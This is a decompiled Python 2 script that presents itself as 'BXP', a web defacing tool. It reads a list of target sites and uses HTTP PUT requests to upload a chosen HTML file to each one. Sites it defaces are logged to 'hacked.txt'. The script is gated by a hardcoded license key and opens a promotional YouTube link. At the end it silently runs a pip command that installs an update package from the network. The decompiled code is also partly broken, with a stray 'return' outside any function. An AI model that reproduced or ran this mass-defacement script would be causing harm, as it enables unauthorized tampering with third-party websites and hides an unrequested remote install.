
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : patched.pyc
# Bytecode Version : 2.7
# Time : Sat Aug  8 14:45:24 2020
#---------------------------------------

import requests
import os
import sys
import time
import itertools
import threading

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
    

os.system('clear')
logo = "\n\x1b[1;91m ______            _______ \n\x1b[1;92m(  ___ \\ |\\     /|(  ____ )\n\x1b[1;93m| (   ) )( \\   / )| (    )|\n\x1b[1;94m| (__/ /  \\ (_) / | (____)|\n\x1b[1;95m|  __ (    ) _ (  |  _____)\n\x1b[1;96m| (  \\ \\  / ( ) \\ | (      \n\x1b[1;91m| )___) )( /   \\ )| )      \n\x1b[1;94m|/ \\___/ |/     \\||/  \x1b[2;96m \x1b[4;96mB O T O L  B A B A\x1b[0m\n\n\x1b[1;93m        IT'S NOT JUST A NAME, IT'S A BRAND\n\x1b[1;97m--------------------------------------------------\n\x1b[1;95m\n AUTHOR     : MEHEDI HASAN ARIYAN\n FACEBOOK   : FACEBOOK.COM/THEMEHTAN\n YOUTUBE    : YOUTUBE.COM/MASTERTRICK1\n GITHUB     : GITHUB.COM/BOTOLMEHEDI\n\x1b[1;32m\n--------------------------------------------------\n"
os.system('clear')
logo2 = "\n\x1b[1;91m ______            _______ \n\x1b[1;92m(  ___ \\ |\\     /|(  ____ )\n\x1b[1;93m| (   ) )( \\   / )| (    )|\n\x1b[1;94m| (__/ /  \\ (_) / | (____)|\n\x1b[1;95m|  __ (    ) _ (  |  _____)\n\x1b[1;96m| (  \\ \\  / ( ) \\ | (      \n\x1b[1;91m| )___) )( /   \\ )| )      \n\x1b[1;94m|/ \\___/ |/     \\||/  \x1b[2;96m \x1b[4;96mB O T O L  B A B A\x1b[0m\n\n\x1b[1;93m        IT'S NOT JUST A NAME, IT'S A BRAND\n--------------------------------------------------\n"
Key = 'VERGIN BOTOL BABA'
loop = 'true'
while loop == 'true':
    print logo
    bxp = raw_input('LICENSE KEY : ')
    if bxp == Key:
        jalan('\n\x1b[34;1m KEY APPROVED BY BOTOL BABA')
        time.sleep(1)
        loop = 'false'
        os.system('clear')
        continue
    if len(sys.argv) != 3:
        os.system('clear')
        print logo
        jalan('\n\x1b[34;1m[*]\x1b[0m HOW TO RUN THIS TOOL?   \n\x1b[34;1m   \x1b[1;93m python2 ' + sys.argv[0] + ' list.txt script.html  \n')
        exit(0)
    os.system('clear')
    print logo2
    os.system('xdg-open https://www.youtube.com/mastertrick1')
    print '\n\x1b[34;1m[\xe2\x80\xa2]\x1b[0m BXP - WEB DEFACING TOOL\n\x1b[34;1m[\xe2\x80\xa2]\x1b[0m CODED BY BOTOL BABA\n'
    target = open(sys.argv[1], 'r')
    while True:
        scheker = open(sys.argv[2]).read()
        sukses = open('hacked.txt', 'a')
        host = target.readline().replace('\n', '')
        if not host:
            break
        if not host.startswith('http'):
            host = 'http://' + host
        outname = '/' + sys.argv[2]
        print '\x1b[34;1m[*]\x1b[0m DEFACEING STARTED : ' + sys.argv[2]
        print '\x1b[34;1m[*]\x1b[0m DEFACE SIZE       : ' + str(len(scheker))
        print '\x1b[34;1m[*]\x1b[0m TARGET SITE       : ' + host
        
        try:
            r = requests.request('put', host + outname, data = scheker, headers = {
                'Content-Type': 'application/octet-stream' })
        except:
            print '\x1b[31;1m[-]\x1b[0m DEFACEING FAILED  : Null Respone\n'
            continue

        if r.status_code == 200:
            print '\x1b[32;1m[\xe2\x88\x9a]\x1b[0m SUCCESS        \x1b[1;92m: ' + host + outname + '\n'
            sukses.write(host + outname + '\n')
            continue
        print '\x1b[31;1m[-]\x1b[0m FAILED        : ' + host + outname + '\n'
    print '\x1b[1;97m[\x1b[1;91m*\x1b[1;97m] \x1b[1;96mHACKED SITE SAVED : \x1b[1;94mhacked.txt'
    print 
    print 'TOOLS UPDATING. PLEASE WAIT....'
    print 
    os.system('pip2 install --upgrade botolbababxp')
    return None
